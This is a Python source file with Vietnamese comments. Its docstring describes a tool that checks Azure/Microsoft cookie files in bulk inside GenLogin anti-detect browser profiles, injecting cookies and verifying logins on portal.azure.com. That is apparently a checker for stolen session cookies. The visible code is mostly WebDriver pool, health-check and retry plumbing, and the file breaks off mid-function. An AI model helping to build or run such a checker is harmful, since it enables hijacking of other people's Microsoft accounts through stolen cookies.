"""
main.py mới 

Chương trình kiểm tra hàng loạt file cookie Azure/Microsoft qua GenLogin.
Phiên bản tối ưu với các cải tiến:
- WebDriver Pool: Quản lý và tái sử dụng driver thay vì tạo mới liên tục
- Xử lý cookie tối ưu với streaming parsing
- Adaptive concurrency: Tự điều chỉnh số lượng worker theo tài nguyên hệ thống
- Quản lý bộ nhớ cải tiến với xử lý batch và disk-based caching
- Kiểm tra đăng nhập nâng cao với timeout thích ứng
- Xác thực thông tin người dùng qua API GetEarlyUserData
- Tách biệt logic kiểm tra thành các thành phần riêng biệt
- Cơ chế retry thông minh và xử lý lỗi mạnh mẽ
"""

import os
import time
import logging
import sys
import json
import csv
import random
import argparse
import tempfile
import io
import re
import psutil
from pathlib import Path
from contextlib import contextmanager
from datetime import datetime, timedelta
import configparser
import threading
import uuid
import concurrent.futures
import queue
import shutil
import traceback
import signal
from typing import Optional, Dict, Any, List, Tuple, Generator, Set, Union, Iterator, Callable
from collections import OrderedDict, defaultdict
from functools import wraps, lru_cache
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, WebDriverException, InvalidSessionIdException,
    NoSuchElementException, StaleElementReferenceException
)

# Module logging_utils: cài đặt setup_logging
from logging_utils import setup_logging

# Module driver_utils: quản lý WebDriver, GenLogin và hàm wait_for_page_load, close_all_tabs
from driver_utils import (
    init_driver_with_genlogin,
    clear_browsing_data,
    close_current_driver,
    verify_driver_connection,
    DriverInitError,
    ProfileRunningError,
    wait_for_page_load,
    close_all_tabs
)

# Module cookie_utils: parse, group, add cookie
from cookie_utils import parse_cookie_file, group_cookies_by_domain, add_cookies_for_domain
from global_state import request_shutdown, is_shutdown_requested
from Genlogin import Genlogin



import urllib3
from urllib3.util.retry import Retry
# Tắt retry mặc định của urllib3
urllib3.util.retry.Retry.DEFAULT = Retry(total=0)  

# --- Global state ---
last_interrupt_time = 0
emergency_exit_in_progress = False


# --- Global variables ---
VERSION = "2.1.0"
DEFAULT_CONFIG_PATH = "config.ini"


def setup_global_socket_timeout():
    """Thiết lập timeout mặc định cho tất cả kết nối socket"""
    try:
        import socket
        socket.setdefaulttimeout(10)  # 10 giây timeout mặc định
        logger = logging.getLogger(__name__)
        logger.debug("Đã thiết lập socket timeout mặc định: 10s")
    except Exception as e:
        print(f"Không thể thiết lập socket timeout: {str(e)}")

# --- Cơ chế retry với exponential backoff ---
def retry_with_backoff(max_retries=3, initial_delay=1, backoff_factor=2, jitter=True):
    """
    Decorator tối ưu với kiểm tra shutdown trước và sau mỗi lần retry
    """
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Kiểm tra shutdown trước khi bắt đầu
            if is_shutdown_requested():
                logger = logging.getLogger()
                logger.warning(f"Shutdown đã được yêu cầu trước khi thực thi {func.__name__}")
                raise RuntimeError("Shutdown requested")
            
            retry_count = 0
            delay = initial_delay
            last_exception = None
            
            while retry_count < max_retries:
                try:
                    return func(*args, **kwargs)
                except (WebDriverException, TimeoutException, StaleElementReferenceException) as e:
                    # Kiểm tra shutdown ngay sau khi bắt exception
                    if is_shutdown_requested():
                        logger = logging.getLogger()
                        logger.warning(f"Shutdown được yêu cầu sau exception, dừng retry {func.__name__}")
                        raise RuntimeError("Shutdown requested during retry") from e
                    
                    retry_count += 1
                    last_exception = e
                    if retry_count >= max_retries:
                        break
                        
                    # Tính thời gian chờ với backoff
                    wait_time = delay * (backoff_factor ** (retry_count - 1))
                    if jitter:
                        wait_time *= random.uniform(0.8, 1.2)
                    
                    logger = logging.getLogger()
                    logger.warning(
                        f"Lỗi {type(e).__name__} khi thực thi {func.__name__} "
                        f"(lần thử {retry_count}/{max_retries}): {str(e)}. "
                        f"Thử lại sau {wait_time:.2f}s"
                    )
                    
                    # Kiểm tra lần nữa trước khi sleep
                    if is_shutdown_requested():
                        logger.warning(f"Shutdown được yêu cầu trước khi sleep, dừng retry {func.__name__}")
                        raise RuntimeError("Shutdown requested before retry sleep") from e
                    
                    # Sử dụng sleep với kiểm tra cờ shutdown
                    for _ in range(int(wait_time * 10)):  # Chia nhỏ sleep thành 0.1s
                        if is_shutdown_requested():
                            logger.warning(f"Shutdown được yêu cầu trong khi sleep, dừng retry {func.__name__}")
                            raise RuntimeError("Shutdown requested during retry sleep") from e
                        time.sleep(0.1)
                    
            # Nếu hết lần retry mà vẫn lỗi, raise exception
            if last_exception:
                raise last_exception
                
        return wrapper
    return decorator

# --- Custom Exceptions ---
class CookieCheckerError(Exception):
    """Ngoại lệ chung cho CookieChecker."""
    pass

class LoginVerificationError(CookieCheckerError):
    """Ngoại lệ khi kiểm tra đăng nhập thất bại."""
    pass

class ResourceUnavailableError(CookieCheckerError):
    """Ngoại lệ khi tài nguyên không khả dụng."""
    pass

class WebDriverPoolError(CookieCheckerError):
    """Ngoại lệ liên quan đến WebDriver Pool."""
    pass

class ApiVerificationError(CookieCheckerError):
    """Ngoại lẹ khi xác thực API thất bại."""
    pass

class GenLoginError(CookieCheckerError):
    """Ngoại lệ khi tương tác với GenLogin thất bại."""
    pass

# --- Configuration Management ---
class SimpleConfig:
    """
    Lớp cấu hình đọc từ file config.ini.
    Hỗ trợ các mục: WebDriver, Timeouts, General, Performance, Domains,
    CookieInjection
    """
    def __init__(self, ini_path: str):
        self.ini_path = ini_path
        self.load_config()

    def load_config(self):
        cp = configparser.ConfigParser(inline_comment_prefixes=('#', ';'))
        try:
            with open(self.ini_path, "r", encoding="utf-8", errors="replace") as f:
                cp.read_file(f)
        except Exception as e:
            raise CookieCheckerError(f"Lỗi đọc file cấu hình {self.ini_path}: {type(e).__name__}: {str(e)}") from e

        # WebDriver settings
        self.chrome_driver_path = cp.get("WebDriver", "driver_path", fallback="chromedriver.exe")

        # Timeout settings
        self.timeouts = {
            "page_load": cp.getint("Timeouts", "page_load", fallback=30),
            "element_wait": cp.getint("Timeouts", "element_wait", fallback=10),
            "cookie_inject": cp.getint("Timeouts", "cookie_inject", fallback=3),
            "login_check": cp.getint("Timeouts", "login_check", fallback=10),
            "retry_delay": cp.getint("Timeouts", "retry_delay", fallback=2),
            "driver_init": cp.getint("Timeouts", "driver_init", fallback=30),
            "driver_ttl": cp.getint("Timeouts", "driver_ttl", fallback=600),
            "connect_genlogin": cp.getint("Timeouts", "connect_genlogin", fallback=15),
            "network_idle": cp.getint("Timeouts", "network_idle", fallback=5),
        }

        # General settings
        self.max_retries = cp.getint("General", "max_retries", fallback=3)
        self.login_check_url = cp.get("General", "login_check_url", fallback="https://portal.azure.com")
        self.force_stop_running = cp.getboolean("General", "force_stop_running", fallback=True)

        # ClearData settings
        if cp.has_section("ClearData"):
            self.clear_data_use_settings = cp.getboolean("ClearData", "use_settings_page", fallback=True)
            self.clear_data_time_range = cp.get("ClearData", "time_range", fallback="all_time")
        else:
            self.clear_data_use_settings = True
            self.clear_data_time_range = "all_time"

        # Cookie Injection settings
        if cp.has_section("CookieInjection"):
            self.initial_batch_size = cp.getint("CookieInjection", "initial_batch_size", fallback=20)
            self.min_batch_size = cp.getint("CookieInjection", "min_batch_size", fallback=5)
            self.max_batch_size = cp.getint("CookieInjection", "max_batch_size", fallback=50)
            self.prioritize_auth = cp.getboolean("CookieInjection", "prioritize_auth", fallback=True)
        else:
            self.initial_batch_size = 20
            self.min_batch_size = 5
            self.max_batch_size = 50
            self.prioritize_auth = True

        # Performance settings
        if cp.has_section("Performance"):
            cpu_count = os.cpu_count() or 2
            self.max_workers = cp.getint("Performance", "max_workers", fallback=min(cpu_count, 4))
            self.driver_pool_size = cp.getint("Performance", "driver_pool_size", fallback=3)
            self.max_memory_percent = cp.getint("Performance", "max_memory_percent", fallback=80)
            self.max_cpu_percent = cp.getint("Performance", "max_cpu_percent", fallback=70)
            self.batch_size = cp.getint("Performance", "batch_size", fallback=50)
        else:
            cpu_count = os.cpu_count() or 2
            self.max_workers = min(cpu_count, 4)
            self.driver_pool_size = 3
            self.max_memory_percent = 80
            self.max_cpu_percent = 70
            self.batch_size = 50

        # Domain mappings
        if cp.has_section("Domains"):
            self.domain_url_map = OrderedDict(cp.items("Domains"))
        else:
            self.domain_url_map = OrderedDict()

    def get_timeout(self, key: str, fallback: Optional[int] = None) -> int:
        return self.timeouts.get(key, fallback if fallback is not None else 0)

    @property
    def as_dict(self) -> Dict[str, Any]:
        """Trả về cấu hình dưới dạng dict để dễ serialize"""
        return {
            "chrome_driver_path": self.chrome_driver_path,
            "timeouts": self.timeouts,
            "max_retries": self.max_retries,
            "login_check_url": self.login_check_url,
            "force_stop_running": self.force_stop_running,
            "max_workers": self.max_workers,
            "driver_pool_size": self.driver_pool_size,
            "batch_size": self.batch_size,
            "domain_count": len(self.domain_url_map),
            "cookie_injection": {
                "initial_batch_size": self.initial_batch_size,
                "min_batch_size": self.min_batch_size,
                "max_batch_size": self.max_batch_size
            }
        }

# --- Resource Monitoring ---
class SystemMonitor:
    """
    Giám sát tài nguyên hệ thống và đưa ra khuyến nghị về
    việc sử dụng tài nguyên hợp lý
    """
    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        
    def get_system_resources(self) -> Dict[str, Any]:
        """Lấy thông tin tài nguyên hệ thống hiện tại"""
        try:
            cpu_count = os.cpu_count() or 2
            cpu_percent = psutil.cpu_percent(interval=0.5)
            memory = psutil.virtual_memory()
            memory_percent = memory.percent
            memory_gb = memory.total / (1024 ** 3)
            memory_available_gb = memory.available / (1024 ** 3)
            
            return {
                "cpu_count": cpu_count,
                "cpu_percent": cpu_percent,
                "memory_total_gb": memory_gb,
                "memory_available_gb": memory_available_gb,
                "memory_percent": memory_percent,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            self.logger.warning(f"Không thể lấy thông tin tài nguyên: {str(e)}")
            return {
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
    
    def recommend_workers(self, max_workers_requested: int) -> int:
        """Khuyến nghị số lượng worker phù hợp dựa trên tài nguyên hệ thống"""
        try:
            resources = self.get_system_resources()
            cpu_count = resources["cpu_count"]
            memory_gb = resources["memory_total_gb"]
            
            # Công thức khuyến nghị:
            # - 1GB RAM cho mỗi worker
            # - Không vượt quá số lõi CPU
            recommended_by_memory = max(1, int(memory_gb / 1.5))
            recommended_by_cpu = max(1, cpu_count)
            recommended = min(recommended_by_memory, recommended_by_cpu)
            
            if max_workers_requested > recommended:
                return recommended
            return max_workers_requested
        except Exception as e:
            self.logger.warning(f"Lỗi khi tính toán worker khuyến nghị: {str(e)}")
            return max_workers_requested
    
    def print_resource_usage(self):
        """In thông tin sử dụng tài nguyên hệ thống ra console."""
        try:
            resources = self.get_system_resources()
            cpu_percent = resources["cpu_percent"]
            memory_percent = resources["memory_percent"]
            memory_available_gb = resources["memory_available_gb"]
            memory_total_gb = resources["memory_total_gb"]
            
            print(f"CPU: {cpu_percent:.1f}% | RAM: {memory_percent:.1f}% ({memory_total_gb-memory_available_gb:.1f}GB/{memory_total_gb:.1f}GB)")
        except Exception as e:
            print(f"Lỗi khi lấy thông tin tài nguyên: {str(e)}")

# --- WebDriver Pool ---
class WebDriverPool:
    """
    Pool quản lý các WebDriver instance để tái sử dụng.
    Cải tiến để khắc phục lỗi 'No Such Execution Context' và các vấn đề liên quan.
    
    Cải tiến chính:
    - Kiểm tra sức khỏe driver mạnh mẽ hơn với kiểm tra execution context
    - Cơ chế tạo và quản lý driver chống lỗi
    - Giám sát tình trạng pool và tự động phục hồi
    - Cơ chế cách ly và xử lý driver lỗi
    """
    def __init__(
        self,
        config: SimpleConfig,
        max_size: int = 3,
        ttl: int = 600,
        logger: Optional[logging.Logger] = None,
        warm_pool: bool = True
    ):
        self.config = config
        self.max_size = max_size
        self.ttl = ttl  # Thời gian sống (giây)
        self.pool = []  # [(driver, gen, profile_id, timestamp, priority, health_score), ...]
        self.lock = threading.RLock()
        self.check_interval = 30  # Giảm xuống 30 giây thay vì 60 giây
        self.last_check = time.time()
        self.logger = logger or logging.getLogger(__name__)
        self.shutdown_flag = False
        self.active_drivers = 0  # Số driver đang được sử dụng
        self.driver_counters = {
            "created": 0, 
            "reused": 0, 
            "failed": 0, 
            "closed": 0,
            "execution_context_errors": 0,
            "recovered": 0
        }
        self.health_metrics = []
        self.auto_replenish = True  # Bật mặc định để tự động phục hồi pool
        self.min_pool_size = 1
        self.max_driver_age = 3600  # 1 giờ, sau đó ưu tiên thay thế driver
        self.execution_context_check_interval = 5  # Giây, kiểm tra execution context mỗi 5 giây
        self.last_execution_context_check = {}  # {profile_id: timestamp}
        
        # Thêm theo dõi lỗi
        self.error_history = {
            "execution_context": {},  # {profile_id: count}
            "no_such_window": {},
            "connection_errors": {},
            "other_errors": {}
        }
        
        # Start health check thread với interval ngắn hơn
        self.health_thread = threading.Thread(target=self._health_check_loop, daemon=True)
        self.health_thread.start()
        
        # Warm up pool nếu cần
        if warm_pool:
            self.warm_up()

    def _try_replenish_pool(self, target_count: int = None):
        """
        Cố gắng bổ sung thêm driver vào pool cho đến khi đạt số lượng mục tiêu.
        Cải tiến với cơ chế handling lỗi tốt hơn.
        """
        if self.shutdown_flag:
            return
            
        target = target_count if target_count is not None else self.min_pool_size
        current_count = len(self.pool)
        
        if current_count >= target:
            return
            
        to_add = min(target - current_count, self.max_size - current_count)
        
        if to_add <= 0:
            return
            
        self.logger.debug(f"Cố gắng bổ sung {to_add} driver vào pool")
        
        for _ in range(to_add):
            try:
                # Kiểm tra cờ shutdown trước mỗi lần tạo driver mới
                if self.shutdown_flag or is_shutdown_requested():
                    self.logger.info("Phát hiện shutdown, dừng bổ sung driver")
                    return
                    
                driver, gen, profile_id = self._create_new_driver()
                
                # Kiểm tra kĩ execution context trước khi thêm vào pool
                if not self._check_execution_context(driver, profile_id):
                    self.logger.warning(f"Driver mới tạo có execution context không ổn định, bỏ qua")
                    close_current_driver(driver, gen, profile_id)
                    self.driver_counters["failed"] += 1
                    continue
                    
                with self.lock:
                    if len(self.pool) < self.max_size and not self.shutdown_flag:
                        # Thêm health_score = 100 (tốt nhất) cho driver mới
                        self.pool.append((driver, gen, profile_id, time.time(), 0, 100))
                        self.driver_counters["created"] += 1
                        self.logger.info(f"Đã bổ sung driver mới với profile {profile_id}")
                    else:
                        self.logger.debug("Pool đã đầy hoặc đang shutdown, đóng driver vừa tạo")
                        close_current_driver(driver, gen, profile_id)
                        self.driver_counters["closed"] += 1
            except Exception as e:
                self.logger.warning(f"Không thể tạo driver mới khi bổ sung pool: {type(e).__name__}: {str(e)}")
                self.driver_counters["failed"] += 1

    def warm_up(self, count: int = 1):
        """
        Khởi tạo trước một số driver để sẵn sàng sử dụng.
        Cải tiến với kiểm tra execution context kỹ lưỡng.
        """
        self.logger.info(f"Khởi tạo trước {count} driver cho pool...")
        successful_drivers = 0
        max_attempts = count * 2  # Cho phép nhiều lần thử hơn để đảm bảo đủ driver
        
        for attempt in range(max_attempts):
            # Dừng nếu đã khởi tạo đủ số lượng driver cần thiết
            if successful_drivers >= count:
                break
                
            try:
                if self.shutdown_flag or is_shutdown_requested():
                    self.logger.info("Phát hiện shutdown, dừng warm up")
                    break
                    
                driver, gen, profile_id = self._create_new_driver()
                
                # Kiểm tra execution context mạnh mẽ
                context_ok = self._check_execution_context(driver, profile_id)
                if not context_ok:
                    self.logger.warning(f"Driver warm-up với profile {profile_id} có execution context không ổn định")
                    close_current_driver(driver, gen, profile_id)
                    continue
                    
                with self.lock:
                    if len(self.pool) < self.max_size:
                        self.pool.append((driver, gen, profile_id, time.time(), 0, 100))  # health_score = 100
                        self.logger.info(f"Đã khởi tạo trước driver với profile {profile_id}")
                        self.driver_counters["created"] += 1
                        successful_drivers += 1
                    else:
                        self.logger.debug("Pool đã đầy, đóng driver vừa tạo")
                        close_current_driver(driver, gen, profile_id)
                        self.driver_counters["closed"] += 1
            except Exception as e:
                self.logger.warning(f"Không thể khởi tạo trước driver (lần thử {attempt+1}/{max_attempts}): {type(e).__name__}: {str(e)}")
                self.driver_counters["failed"] += 1
                
        self.logger.info(f"Warm up hoàn tất: {successful_drivers}/{count} driver đã sẵn sàng")

    def _health_check_loop(self):
        """
        Kiểm tra định kỳ sức khỏe của driver trong pool.
        Cải tiến với kiểm tra execution context thường xuyên.
        """
        while not self.shutdown_flag:
            try:
                # Kiểm tra cờ shutdown
                if is_shutdown_requested():
                    self.logger.info("Phát hiện cờ đóng, dừng health_check_loop")
                    break

                current_time = time.time()
                # Chạy health check đều đặn theo interval
                if current_time - self.last_check > self.check_interval:
                    self._perform_health_check()
                    self.last_check = current_time
                    
                    # Nếu pool đang thiếu driver, bổ sung thêm
                    if len(self.pool) < self.min_pool_size:
                        self._try_replenish_pool()
            except Exception as e:
                self.logger.error(f"Lỗi health check: {type(e).__name__}: {str(e)}")
                try:
                    # Ghi traceback để debug
                    import traceback
                    self.logger.debug(f"Traceback health check: {traceback.format_exc()}")
                except:
                    pass
            # Giảm thời gian sleep để phản ứng nhanh hơn với các vấn đề
            time.sleep(3)

    def _perform_health_check(self):
        """
        Thực hiện kiểm tra sức khỏe của tất cả driver trong pool.
        Cải tiến với phân loại và xử lý các loại lỗi khác nhau.
        """
        with self.lock:
            initial_count = len(self.pool)
            if initial_count == 0:
                return  # Pool trống, không cần check
                
            # Tạo danh sách mới chỉ chứa các driver hợp lệ và danh sách các driver cần đóng
            valid_drivers = []
            invalid_drivers = []
            
            # Kiểm tra từng driver trong pool
            for item in self.pool:
                driver, gen, profile_id, timestamp, priority, health_score = item
                current_time = time.time()
                
                # Kiểm tra TTL và sức khỏe
                expired = current_time - timestamp >= self.ttl
                health_check_result, new_health_score = self._check_driver_health(driver, profile_id, health_score)
                
                if expired or not health_check_result:
                    reason = "expired" if expired else "unhealthy"
                    invalid_drivers.append((item, reason))
                else:
                    # Cập nhật health_score
                    valid_drivers.append((driver, gen, profile_id, timestamp, priority, new_health_score))
            
            # Ghi nhận số lượng driver bị loại bỏ
            removed = len(invalid_drivers)
            
            # Đóng các driver không hợp lệ
            for (driver, gen, profile_id, _, _, _), reason in invalid_drivers:
                try:
                    self.logger.debug(f"Đóng driver không hợp lệ ({reason}) cho profile {profile_id}")
                    close_current_driver(driver, gen, profile_id)
                    self.driver_counters["closed"] += 1
                except Exception as e:
                    self.logger.warning(f"Lỗi khi đóng driver không hợp lệ: {str(e)}")
            
            # Cập nhật pool với chỉ các driver hợp lệ
            self.pool = valid_drivers
                
            # Ghi log kết quả
            if removed > 0:
                self.logger.debug(f"Đã loại bỏ {removed} driver hết hạn/không hoạt động")
                
            # Lưu metric
            current_time = time.time()
            self.health_metrics.append({
                "timestamp": current_time,
                "active_drivers": self.active_drivers,
                "pool_size": len(self.pool),
                "removed_drivers": removed,
                "created": self.driver_counters["created"],
                "reused": self.driver_counters["reused"],
                "failed": self.driver_counters["failed"],
                "closed": self.driver_counters["closed"],
                "execution_context_errors": self.driver_counters["execution_context_errors"],
                "check_duration": current_time - (self.health_metrics[-1]["timestamp"] if self.health_metrics else current_time)
            })
            
            # Giới hạn lịch sử metric
            if len(self.health_metrics) > 100:
                self.health_metrics = self.health_metrics[-100:]
            
            # Khởi tạo driver mới nếu cần
            if self.auto_replenish and len(self.pool) < self.min_pool_size and not self.shutdown_flag:
                self._try_replenish_pool(target_count=self.min_pool_size)

    def _check_driver_health(self, driver, profile_id, current_health_score=100):
        """
        Kiểm tra sức khỏe driver với đánh giá chi tiết và cập nhật health score.
        
        Returns:
            Tuple[bool, int]: (driver_healthy, new_health_score)
        """
        if not driver:
            return False, 0
            
        try:
            # Khởi tạo health score mới, bắt đầu từ điểm hiện tại
            new_health_score = current_health_score
            
            # 1. Kiểm tra cơ bản kết nối driver
            if not verify_driver_connection(driver):
                self.logger.debug(f"Driver của profile {profile_id} mất kết nối cơ bản")
                return False, 0
                
            # 2. Kiểm tra window handles
            try:
                window_handles = driver.window_handles
                if not window_handles or len(window_handles) == 0:
                    self.logger.debug(f"Driver của profile {profile_id} không có cửa sổ nào")
                    return False, 0
            except Exception as e:
                self.logger.debug(f"Lỗi kiểm tra window handles cho profile {profile_id}: {str(e)}")
                self._track_error(profile_id, e)
                return False, 0
                
            # 3. Kiểm tra execution context quan trọng nhất
            if not self._check_execution_context(driver, profile_id):
                return False, 0
                
            # 4. Thử lấy thông tin trang (URL hiện tại)
            try:
                current_url = driver.current_url
                # Giảm health score nếu URL không phải HTTP/HTTPS
                if not (current_url.startswith('http://') or current_url.startswith('https://')):
                    new_health_score = max(new_health_score - 10, 50)
            except Exception as e:
                self.logger.debug(f"Không thể lấy URL hiện tại cho profile {profile_id}: {str(e)}")
                self._track_error(profile_id, e)
                new_health_score = max(new_health_score - 20, 30)
                
            # 5. Thử lấy document.readyState
            try:
                ready_state = driver.execute_script("return document.readyState")
                if ready_state not in ['interactive', 'complete']:
                    new_health_score = max(new_health_score - 10, 40)
            except Exception as e:
                self.logger.debug(f"Không thể kiểm tra readyState cho profile {profile_id}: {str(e)}")
                self._track_error(profile_id, e)
                new_health_score = max(new_health_score - 15, 30)
                
            # 6. Kiểm tra process ChromeDriver còn chạy không
            try:
                if hasattr(driver, 'service') and hasattr(driver.service, 'process'):
                    if driver.service.process is None or driver.service.process.poll() is not None:
                        self.logger.debug(f"Process ChromeDriver của profile {profile_id} không còn chạy")
                        return False, 0
            except Exception:
                # Bỏ qua nếu không thể kiểm tra process
                pass
                
            # Nếu health score thấp hơn ngưỡng, coi như driver không khỏe
            if new_health_score < 50:
                self.logger.debug(f"Driver profile {profile_id} có health score thấp: {new_health_score}")
                return False, new_health_score
                
            return True, new_health_score
                
        except Exception as e:
            self.logger.debug(f"Lỗi không xác định khi kiểm tra driver profile {profile_id}: {str(e)}")
            self._track_error(profile_id, e)
            return False, 0

    def _check_execution_context(self, driver, profile_id):
        """
        Kiểm tra riêng execution context để phát hiện sớm lỗi "no such execution context".
        
        Returns:
            bool: True nếu execution context hoạt động tốt, False nếu lỗi
        """
        if not driver:
            return False
            
        # Thêm đánh dấu thời gian kiểm tra
        current_time = time.time()
        last_check = self.last_execution_context_check.get(profile_id, 0)
        
        # Chỉ kiểm tra theo interval để tránh kiểm tra quá thường xuyên
        if current_time - last_check < self.execution_context_check_interval:
            return True  # Giả định context còn tốt nếu mới kiểm tra gần đây
        
        self.last_execution_context_check[profile_id] = current_time
        
        try:
            # Thực hiện một script đơn giản để kiểm tra execution context
            result = driver.execute_script("return navigator.userAgent")
            if not result:
                self.logger.debug(f"Execution context cho profile {profile_id} không ổn định (userAgent trống)")
                return False
            return True
        except Exception as e:
            error_msg = str(e).lower()
            
            # Ghi nhận chi tiết để có thể quản lý tốt hơn
            if "no such execution context" in error_msg:
                self.logger.warning(f"Phát hiện lỗi 'no such execution context' cho profile {profile_id}")
                self.driver_counters["execution_context_errors"] += 1
                
                # Cập nhật lịch sử lỗi
                if profile_id not in self.error_history["execution_context"]:
                    self.error_history["execution_context"][profile_id] = 0
                self.error_history["execution_context"][profile_id] += 1
                
            elif "no such window" in error_msg:
                self.logger.warning(f"Phát hiện lỗi 'no such window' cho profile {profile_id}")
                
                # Cập nhật lịch sử lỗi
                if profile_id not in self.error_history["no_such_window"]:
                    self.error_history["no_such_window"][profile_id] = 0
                self.error_history["no_such_window"][profile_id] += 1
                
            else:
                self.logger.debug(f"Lỗi execution context cho profile {profile_id}: {str(e)}")
                
                # Cập nhật lịch sử lỗi
                if profile_id not in self.error_history["other_errors"]:
                    self.error_history["other_errors"][profile_id] = 0
                self.error_history["other_errors"][profile_id] += 1
                
            return False

    def _track_error(self, profile_id, exception):
        """
        Theo dõi các loại lỗi để phân tích và xử lý.
        """
        error_type = type(exception).__name__
        error_msg = str(exception).lower()
        
        if "execution context" in error_msg:
            if profile_id not in self.error_history["execution_context"]:
                self.error_history["execution_context"][profile_id] = 0
            self.error_history["execution_context"][profile_id] += 1
            self.driver_counters["execution_context_errors"] += 1
            
        elif "no such window" in error_msg:
            if profile_id not in self.error_history["no_such_window"]:
                self.error_history["no_such_window"][profile_id] = 0
            self.error_history["no_such_window"][profile_id] += 1
            
        elif "connection" in error_msg or "timeout" in error_msg:
            if profile_id not in self.error_history["connection_errors"]:
                self.error_history["connection_errors"][profile_id] = 0
            self.error_history["connection_errors"][profile_id] += 1
            
        else:
            if profile_id not in self.error_history["other_errors"]:
                self.error_history["other_errors"][profile_id] = 0
            self.error_history["other_errors"][profile_id] += 1

    def get_driver(self, priority: int = 0) -> Tuple[webdriver.Chrome, Any, str]:
        """
        Lấy driver khả dụng từ pool hoặc tạo mới nếu cần.
        Cải tiến với kiểm tra execution context kỹ lưỡng trước khi trả về.
        
        Args:
            priority: Mức độ ưu tiên (cao hơn được xử lý trước)
            
        Returns:
            Tuple[driver, gen, profile_id]
        """
        with self.lock:
            if self.shutdown_flag:
                raise WebDriverPoolError("WebDriver Pool đang trong quá trình shutdown")

            # Loại bỏ driver hết hạn hoặc không hoạt động
            now = time.time()
            initial_count = len(self.pool)
            
            # Kiểm tra sức khỏe và cập nhật health_score cho tất cả driver trong pool
            validated_pool = []
            for d, g, p, t, pri, health_score in self.pool:
                # Kiểm tra TTL
                if now - t >= self.ttl:
                    try:
                        self.logger.debug(f"Driver của profile {p} hết hạn TTL ({self.ttl}s), đóng")
                        close_current_driver(d, g, p)
                        self.driver_counters["closed"] += 1
                    except Exception as e:
                        self.logger.warning(f"Lỗi đóng driver hết hạn: {str(e)}")
                    continue
                
                # Kiểm tra sức khỏe và cập nhật health_score
                health_check_result, new_health_score = self._check_driver_health(d, p, health_score)
                if health_check_result:
                    validated_pool.append((d, g, p, t, pri, new_health_score))
                else:
                    try:
                        self.logger.debug(f"Driver của profile {p} không khỏe (score: {new_health_score}), đóng")
                        close_current_driver(d, g, p)
                        self.driver_counters["closed"] += 1
                    except Exception as e:
                        self.logger.warning(f"Lỗi đóng driver không khỏe: {str(e)}")
            
            removed = initial_count - len(validated_pool)
            if removed > 0:
                self.logger.debug(f"Đã loại bỏ {removed} driver hết hạn/không khỏe")
                
            self.pool = validated_pool
            
            # Nếu pool hiện tại trống, tạo driver mới
            if not self.pool:
                self.logger.info("Pool trống, tạo driver mới")
                try:
                    driver, gen, profile_id = self._create_new_driver()
                    
                    # Kiểm tra execution context ngay sau khi tạo
                    context_ok = self._check_execution_context(driver, profile_id)
                    if not context_ok:
                        self.logger.warning("Driver mới tạo có execution context không ổn định, tạo lại")
                        close_current_driver(driver, gen, profile_id)
                        
                        # Tạo lại driver một lần nữa
                        driver, gen, profile_id = self._create_new_driver()
                        if not self._check_execution_context(driver, profile_id):
                            self.logger.error("Driver mới tạo lần 2 vẫn lỗi execution context")
                            close_current_driver(driver, gen, profile_id)
                            self.driver_counters["failed"] += 1
                            raise WebDriverPoolError("Không thể tạo driver mới với execution context ổn định")
                    
                    self.logger.info(f"Đã tạo driver mới cho profile {profile_id}")
                    self.active_drivers += 1
                    self.driver_counters["created"] += 1
                    return driver, gen, profile_id
                except Exception as e:
                    self.logger.error(f"Không thể tạo driver mới: {type(e).__name__}: {str(e)}")
                    self.driver_counters["failed"] += 1
                    raise WebDriverPoolError(f"Không thể tạo driver mới: {str(e)}") from e

            # Trả về driver hiện có nếu có, ưu tiên theo priority và health_score
            if self.pool:
                # Sắp xếp theo priority (cao đến thấp) và health_score (cao đến thấp)
                self.pool.sort(key=lambda x: (x[4], x[5]), reverse=True)
                
                # Lấy driver từ đầu pool
                driver, gen, profile_id, _, _, health_score = self.pool.pop(0)
                
                # Kiểm tra execution context một lần nữa trước khi trả về
                context_ok = self._check_execution_context(driver, profile_id)
                if not context_ok:
                    self.logger.warning(f"Driver lấy từ pool ({profile_id}) có lỗi execution context, đóng")
                    try:
                        close_current_driver(driver, gen, profile_id)
                        self.driver_counters["closed"] += 1
                    except Exception as e:
                        self.logger.warning(f"Lỗi đóng driver lỗi context: {str(e)}")
                    
                    # Nếu còn driver khác trong pool, thử lại
                    if self.pool:
                        self.logger.info("Thử lấy driver khác từ pool")
                        driver, gen, profile_id, _, _, health_score = self.pool.pop(0)
                        context_ok = self._check_execution_context(driver, profile_id)
                        if not context_ok:
                            self.logger.warning(f"Driver thứ 2 từ pool ({profile_id}) cũng lỗi context, tạo mới")
                            try:
                                close_current_driver(driver, gen, profile_id)
                                self.driver_counters["closed"] += 1
                            except Exception:
                                pass
                            
                            # Tạo driver mới
                            driver, gen, profile_id = self._create_new_driver()
                            if not self._check_execution_context(driver, profile_id):
                                self.logger.error("Driver mới tạo vẫn lỗi execution context")
                                close_current_driver(driver, gen, profile_id)
                                self.driver_counters["failed"] += 1
                                raise WebDriverPoolError("Không thể tạo driver với execution context ổn định")
                    else:
                        # Tạo driver mới
                        driver, gen, profile_id = self._create_new_driver()
                        if not self._check_execution_context(driver, profile_id):
                            self.logger.error("Driver mới tạo vẫn lỗi execution context")
                            close_current_driver(driver, gen, profile_id)
                            self.driver_counters["failed"] += 1
                            raise WebDriverPoolError("Không thể tạo driver với execution context ổn định")
                
                self.logger.debug(f"Tái sử dụng driver với profile {profile_id} (health: {health_score})")
                self.active_drivers += 1
                self.driver_counters["reused"] += 1
                
                # Cập nhật thời gian kiểm tra execution context
                self.last_execution_context_check[profile_id] = time.time()
                
                return driver, gen, profile_id

            # Nếu đến đây mà không có driver, tạo mới
            try:
                driver, gen, profile_id = self._create_new_driver()
                
                # Kiểm tra execution context
                if not self._check_execution_context(driver, profile_id):
                    self.logger.warning("Driver mới tạo lỗi execution context, thử lại")
                    close_current_driver(driver, gen, profile_id)
                    
                    # Thử lại lần nữa
                    driver, gen, profile_id = self._create_new_driver()
                    if not self._check_execution_context(driver, profile_id):
                        self.logger.error("Driver mới tạo lần 2 vẫn lỗi execution context")
